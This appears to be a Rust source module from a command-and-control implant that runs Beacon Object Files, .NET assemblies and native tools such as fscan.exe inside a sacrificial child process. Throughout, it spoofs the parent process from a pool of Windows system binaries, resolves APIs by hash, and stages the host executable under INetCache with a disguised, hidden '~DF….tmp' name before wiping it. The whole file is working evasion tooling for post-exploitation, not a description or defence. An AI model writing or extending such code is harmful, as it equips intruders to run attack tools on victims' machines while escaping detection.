//! Isolated BOF/.NET execution via PPID-spoofed sacrificial host.
//!
//! Agent does **not** run BOF/CLR in-process. It:
//! 1. Stages short-lived host PE (random name under cache/local dir — **must** land briefly for CreateProcess)
//! 2. CreateProcess with rotating parent spoof + stdin/stdout pipes
//! 3. Writes job frame (seed-derived magic), result back over pipe; BOF/.NET payload stays **in memory on the pipe**
//! 4. Deletes host PE after exit
//!
//! Note: the **host EXE** is not zero-disk (CreateProcess needs a path); the **BOF/assembly body** is not written to disk.

use crate::types::CommandResult;
use crate::wire_ids::JOB_MAGIC;
use log::info;
use std::path::PathBuf;

pub const MOD_ISO_HOST: &str = "iso_host";
const KIND_BOF: u32 = 1;
const KIND_DOTNET: u32 = 2;

/// Execute BOF in isolated host (Windows).
#[cfg(windows)]
pub async fn run_bof_isolated(coff: &[u8], args: &[u8]) -> CommandResult {
    match run_job(KIND_BOF, coff, args).await {
        Ok((o, e)) => CommandResult {
            stdout: o,
            stderr: e,
            path: None,
            req_id: None,
        },
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: format!("isolated bof: {e}"),
            path: None,
            req_id: None,
        },
    }
}

/// Execute .NET assembly in isolated host (Windows).
#[cfg(windows)]
pub async fn run_dotnet_isolated(assembly: &[u8], args: &[String]) -> CommandResult {
    let args_raw = serde_json::to_vec(args).unwrap_or_default();
    match run_job(KIND_DOTNET, assembly, &args_raw).await {
        Ok((o, e)) => CommandResult {
            stdout: o,
            stderr: e,
            path: None,
            req_id: None,
        },
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: format!("isolated dotnet: {e}"),
            path: None,
            req_id: None,
        },
    }
}

#[cfg(not(windows))]
pub async fn run_bof_isolated(_coff: &[u8], _args: &[u8]) -> CommandResult {
    CommandResult {
        stdout: String::new(),
        stderr: "isolated exec: windows only".into(),
        path: None,
        req_id: None,
    }
}

#[cfg(not(windows))]
pub async fn run_dotnet_isolated(_assembly: &[u8], _args: &[String]) -> CommandResult {
    CommandResult {
        stdout: String::new(),
        stderr: "isolated exec: windows only".into(),
        path: None,
        req_id: None,
    }
}

/// Run a native PE (e.g. fscan.exe) in a PPID-spoofed short-lived process.
/// Writes PE to TEMP, CreateProcess with args, captures stdout/stderr, deletes file.
#[cfg(windows)]
pub async fn run_native_isolated(pe: &[u8], args: &str) -> CommandResult {
    match run_native_job(pe, args).await {
        Ok((o, e)) => CommandResult {
            stdout: o,
            stderr: e,
            path: None,
            req_id: None,
        },
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: format!("isolated native: {e}"),
            path: None,
            req_id: None,
        },
    }
}

#[cfg(not(windows))]
pub async fn run_native_isolated(_pe: &[u8], _args: &str) -> CommandResult {
    CommandResult {
        stdout: String::new(),
        stderr: "isolated native: windows only".into(),
        path: None,
        req_id: None,
    }
}

#[cfg(windows)]
async fn run_native_job(pe: &[u8], args: &str) -> Result<(String, String), String> {
    use crate::module_supervisor::{job_object::JobObject, MAX_OUTPUT_BYTES};

    tokio::task::yield_now().await;
    crate::utils::opsec_heavy_pace_async().await;
    if pe.len() < 64 || pe[0] != b'M' || pe[1] != b'Z' {
        return Err("payload is not a PE (MZ missing)".into());
    }
    if pe.len() > crate::module_supervisor::MAX_PAYLOAD_BYTES {
        return Err("native payload too large".into());
    }

    let path = write_temp_host(pe)?;
    let path_str = path.to_string_lossy().to_string();
    let cmdline = if args.trim().is_empty() {
        format!("\"{}\"", path_str)
    } else {
        format!("\"{}\" {}", path_str, args.trim())
    };
    let parent = pick_parent_image();
    let child = match crate::native::spawn::spawn_spoofed_piped_result(&cmdline, parent) {
        Ok(c) => {
            info!("[iso-native] pid={}", c.pid);
            c
        }
        Err(e) => {
            let _ = std::fs::remove_file(&path);
            return Err(format!("spawn failed: {e}"));
        }
    };
    let job = match JobObject::create() {
        Some(j) => j,
        None => {
            let _ = crate::native::terminate_process_handle(child.h_process);
            close_child_handles(&child);
            burn_disk_path(&Some(path));
            return Err("worker isolation unavailable".into());
        }
    };
    if job.assign_process(child.h_process).is_err() {
        let _ = crate::native::terminate_process_handle(child.h_process);
        close_child_handles(&child);
        burn_disk_path(&Some(path));
        return Err("worker isolation setup failed".into());
    }
    let _ = crate::native::close_handle(child.stdin_write);

    // Bound the read at MAX_OUTPUT_BYTES so we never buffer the full 32 MiB
    // pipe cap before rejecting. Truncation terminates the worker.
    let stdout_read = child.stdout_read;
    let max_out = MAX_OUTPUT_BYTES;
    let reader = std::thread::spawn(move || {
        let buf = crate::native::pipe_read_to_end_bounded(stdout_read, max_out);
        let truncated = buf.len() >= max_out;
        (buf, truncated)
    });
    let wait_ms = 30_000u32;
    if !crate::native::wait_for_single_object_timeout(child.h_process, wait_ms) {
        let _ = job.terminate(1);
        let _ = crate::native::terminate_process_handle(child.h_process);
        let _ = reader.join();
        let _ = crate::native::close_handle(child.h_process);
        burn_disk_path(&Some(path));
        return Err("worker timeout".into());
    }

    let (out_buf, truncated) = reader
        .join()
        .map_err(|_| "worker reader panicked".to_string())?;
    if truncated {
        let _ = job.terminate(1);
        let _ = crate::native::terminate_process_handle(child.h_process);
        let _ = crate::native::close_handle(child.h_process);
        burn_disk_path(&Some(path));
        return Err("worker output too large".into());
    }
    let _ = crate::native::close_handle(child.h_process);
    burn_disk_path(&Some(path));

    let text = {
        #[cfg(feature = "encoding-support")]
        {
            if std::str::from_utf8(&out_buf).is_err() {
                let (cow, _, _) = encoding_rs::GBK.decode(&out_buf);
                cow.into_owned()
            } else {
                String::from_utf8_lossy(&out_buf).into_owned()
            }
        }
        #[cfg(not(feature = "encoding-support"))]
        {
            String::from_utf8_lossy(&out_buf).into_owned()
        }
    };
    Ok((text, String::new()))
}

#[cfg(windows)]
fn close_child_handles(child: &crate::native::spawn::SpoofedPipedChild) {
    let _ = crate::native::close_handle(child.stdin_write);
    let _ = crate::native::close_handle(child.stdout_read);
    let _ = crate::native::close_handle(child.h_process);
}

#[cfg(windows)]
async fn run_job(kind: u32, payload: &[u8], args: &[u8]) -> Result<(String, String), String> {
    use crate::module_supervisor::{MAX_OUTPUT_BYTES, MAX_PAYLOAD_BYTES};

    if payload.len() > MAX_PAYLOAD_BYTES || args.len() > MAX_PAYLOAD_BYTES {
        return Err("worker payload too large".into());
    }
    let deadline_ms = 30_000u64;
    let payload = payload.to_vec();
    let args = args.to_vec();

    // All Win32 pipe operations run off the async executor. The timeout path
    // owns the process handles and terminates the Job Object before returning.
    tokio::task::spawn_blocking(move || {
        run_job_blocking(kind, &payload, &args, deadline_ms, MAX_OUTPUT_BYTES)
    })
    .await
    .map_err(|e| format!("worker thread: {e}"))?
}

#[cfg(windows)]
fn run_job_blocking(
    kind: u32,
    payload: &[u8],
    args: &[u8],
    deadline_ms: u64,
    max_output: usize,
) -> Result<(String, String), String> {
    use crate::module_supervisor::job_object::JobObject;

    crate::utils::opsec_heavy_pace();
    let pe = resolve_iso_host_pe()?;
    let parent = pick_parent_image();
    let (child, disk_path) = spawn_isolated_host(&pe, parent)?;
    let job = JobObject::create().ok_or_else(|| {
        let _ = crate::native::terminate_process_handle(child.h_process);
        "worker isolation unavailable".to_string()
    })?;
    if job.assign_process(child.h_process).is_err() {
        let _ = crate::native::terminate_process_handle(child.h_process);
        let _ = crate::native::close_handle(child.stdin_write);
        let _ = crate::native::close_handle(child.stdout_read);
        let _ = crate::native::close_handle(child.h_process);
        burn_disk_path(&disk_path);
        return Err("worker isolation setup failed".into());
    }

    let mut frame = Vec::with_capacity(16 + payload.len() + args.len());
    frame.extend_from_slice(&JOB_MAGIC);
    frame.extend_from_slice(&kind.to_le_bytes());
    frame.extend_from_slice(&(payload.len() as u32).to_le_bytes());
    frame.extend_from_slice(&(args.len() as u32).to_le_bytes());
    frame.extend_from_slice(payload);
    frame.extend_from_slice(args);
    crate::native::pipe_write_all(child.stdin_write, &frame)?;
    let _ = crate::native::close_handle(child.stdin_write);

    let stdout_handle = child.stdout_read;
    let reader = std::thread::spawn(move || -> Result<(Vec<u8>, Vec<u8>), String> {
        let hdr = crate::native::pipe_read_exact(stdout_handle, 8)?;
        let out_len = u32::from_le_bytes(hdr[0..4].try_into().unwrap()) as usize;
        let err_len = u32::from_le_bytes(hdr[4..8].try_into().unwrap()) as usize;
        if out_len > max_output || err_len > max_output {
            return Err("worker output too large".into());
        }
        let out = crate::native::pipe_read_exact(stdout_handle, out_len)?;
        let err = crate::native::pipe_read_exact(stdout_handle, err_len)?;
        let _ = crate::native::close_handle(stdout_handle);
        Ok((out, err))
    });

    let wait_ms = crate::module_supervisor::clamp_worker_deadline_ms(deadline_ms);
    let signaled = crate::native::wait_for_single_object_timeout(child.h_process, wait_ms);
    if crate::module_supervisor::should_force_kill_on_wait(signaled) {
        let _ = job.terminate(1);
        let _ = crate::native::terminate_process_handle(child.h_process);
        let _ = crate::native::close_handle(child.h_process);
        let _ = reader.join();
        burn_disk_path(&disk_path);
        return Err("worker timeout".into());
    }

    let result = reader
        .join()
        .map_err(|_| "worker reader panicked".to_string())??;
    let _ = crate::native::close_handle(child.h_process);
    burn_disk_path(&disk_path);
    Ok((
        String::from_utf8_lossy(&result.0).into_owned(),
        String::from_utf8_lossy(&result.1).into_owned(),
    ))
}

/// Spawn host PE: zero-disk (x64) → classic temp file fallback.
/// Returns (child, optional residual path that must be burned if Some).
#[cfg(windows)]
fn spawn_isolated_host(
    pe: &[u8],
    parent: &str,
) -> Result<(crate::native::spawn::SpoofedPipedChild, Option<PathBuf>), String> {
    #[cfg(target_arch = "x86_64")]
    {
        match crate::native::ghost_host::spawn_host_zero_disk(pe, parent) {
            Ok(c) => return Ok((c, None)),
            Err(e) => {
                info!("[iso] zero-disk host failed ({e}), falling back to temp stage");
            }
        }
    }
    let path = write_temp_host(pe)?;
    let path_str = path.to_string_lossy().to_string();
    match crate::native::spawn::spawn_spoofed_piped_result(&path_str, parent) {
        Ok(c) => Ok((c, Some(path))),
        Err(e) => {
            let _ = std::fs::remove_file(&path);
            Err(format!("spawn failed: {e}"))
        }
    }
}

fn burn_disk_path(path: &Option<PathBuf>) {
    if let Some(p) = path {
        let _ = std::fs::write(p, b"");
        let _ = std::fs::remove_file(p);
    }
}

fn pick_parent_image() -> &'static str {
    // Rotate preferred parent; spawn layer still falls back across the pool.
    const POOL: &[&str] = &[
        "RuntimeBroker.exe",
        "sihost.exe",
        "taskhostw.exe",
        "svchost.exe",
        "explorer.exe",
        "dllhost.exe",
    ];
    let i = (crate::utils::next_u32_secure() as usize) % POOL.len();
    POOL[i]
}

/// Public for ModuleSupervisor parent spoof pool.
pub fn pick_parent_for_supervisor() -> &'static str {
    #[cfg(windows)]
    {
        pick_parent_image()
    }
    #[cfg(not(windows))]
    {
        ""
    }
}

fn resolve_iso_host_pe() -> Result<Vec<u8>, String> {
    // 1) Staged as module payload (not LoadLibrary — host PE)
    #[cfg(feature = "module-loader")]
    {
        if let Some(pe) = crate::module_loader::registry().get_host_pe(MOD_ISO_HOST) {
            if pe.len() > 64 && pe[0] == b'M' && pe[1] == b'Z' {
                return Ok(pe);
            }
        }
    }
    // 2) Beside agent / cwd — neutral filenames only (no product brand)
    let mut candidates = Vec::new();
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            candidates.push(dir.join("host_helper.exe"));
            candidates.push(dir.join("runtime_host.exe"));
            candidates.push(dir.join("iso_host.exe"));
        }
    }
    candidates.push(PathBuf::from("host_helper.exe"));
    candidates.push(PathBuf::from("iso_host.exe"));
    for p in candidates {
        if let Ok(b) = std::fs::read(&p) {
            if b.len() > 64 && b[0] == b'M' && b[1] == b'Z' {
                return Ok(b);
            }
        }
    }
    Err("host runtime missing: stage module id=iso_host first".into())
}

/// Brief on-disk host PE for CreateProcess (payload job body stays on the pipe only).
fn write_temp_host(pe: &[u8]) -> Result<PathBuf, String> {
    let dir = host_staging_dir();
    let _ = std::fs::create_dir_all(&dir);
    // Look like a cache object, not a product name
    let a = crate::utils::next_u32_secure();
    let b = crate::utils::next_u32_secure();
    let name = format!("~DF{:08X}{:04X}.tmp", a, (b & 0xffff) as u32);
    let path = dir.join(name);
    std::fs::write(&path, pe).map_err(|e| format!("stage host: {e}"))?;
    // Best-effort hide (Windows)
    #[cfg(windows)]
    {
        use std::os::windows::ffi::OsStrExt;
        let wide: Vec<u16> = path.as_os_str().encode_wide().chain(Some(0)).collect();
        unsafe {
            // FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY = 0x2 | 0x100
            type SetFileAttributesWFn = unsafe extern "system" fn(*const u16, u32) -> i32;
            let k32 =
                crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
            if let Some(addr) = crate::stealth::get_api_addr(
                k32,
                crate::stealth::hash_api_name(b"SetFileAttributesW"),
            ) {
                let f: SetFileAttributesWFn = std::mem::transmute(addr);
                let _ = f(wide.as_ptr(), 0x0000_0102);
            }
        }
    }
    Ok(path)
}

fn host_staging_dir() -> PathBuf {
    // Prefer per-user cache over world-readable %TEMP% when available
    if let Ok(local) = std::env::var("LOCALAPPDATA") {
        return PathBuf::from(local)
            .join("Microsoft")
            .join("Windows")
            .join("INetCache");
    }
    if let Ok(xdg) = std::env::var("XDG_CACHE_HOME") {
        return PathBuf::from(xdg).join("fontconfig");
    }
    std::env::temp_dir()
}
